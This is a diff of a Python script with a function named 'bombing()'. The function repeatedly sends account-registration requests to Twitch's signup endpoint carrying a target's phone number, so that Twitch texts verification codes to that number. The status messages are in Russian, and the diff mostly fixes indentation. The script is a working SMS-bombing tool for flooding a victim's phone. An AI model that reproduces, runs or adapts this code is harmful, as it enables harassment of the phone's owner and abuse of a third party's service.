@@ -86,55 +86,64 @@ def bombing():
     email = name+f'{iteration}'+'@gmail.com'
     email = name+f'{iteration}'+'@gmail.com'
 
-                    try:
+    try:
         requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
         print('[+] Twitch отправлено!')
     except:
         print('[-] Не отправлено!')
-                    try:
+
+    try:
         requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
         print('[+] Twitch отправлено!')
     except:
         print('[-] Не отправлено!')
-                    try:
+
+    try:
         requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
         print('[+] Twitch отправлено!')
     except:
         print('[-] Не отправлено!')
-                    try:
+
+    try:
         requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
         print('[+] Twitch отправлено!')
     except:
         print('[-] Не отправлено!')
-                    try:
+
+    try:
         requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
         print('[+] Twitch отправлено!')
     except:
         print('[-] Не отправлено!')
-                    try:
+
+    try:
         requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
         print('[+] Twitch отправлено!')
     except:
         print('[-] Не отправлено!')
-                    try:
+
+    try:
         requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
         print('[+] Twitch отправлено!')
     except:
         print('[-] Не отправлено!')
-                    try:
+
+    try:
         requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
         print('[+] Twitch отправлено!')
     except:
         print('[-] Не отправлено!')
-                    try:
+
+    try:
         requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
         print('[+] Twitch отправлено!')
     except:
         print('[-] Не отправлено!')
-                    try:
+
+    try:
         requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
         print('[+] Twitch отправлено!')
     except:
         print('[-] Не отправлено!')
-        
+
 Logo()
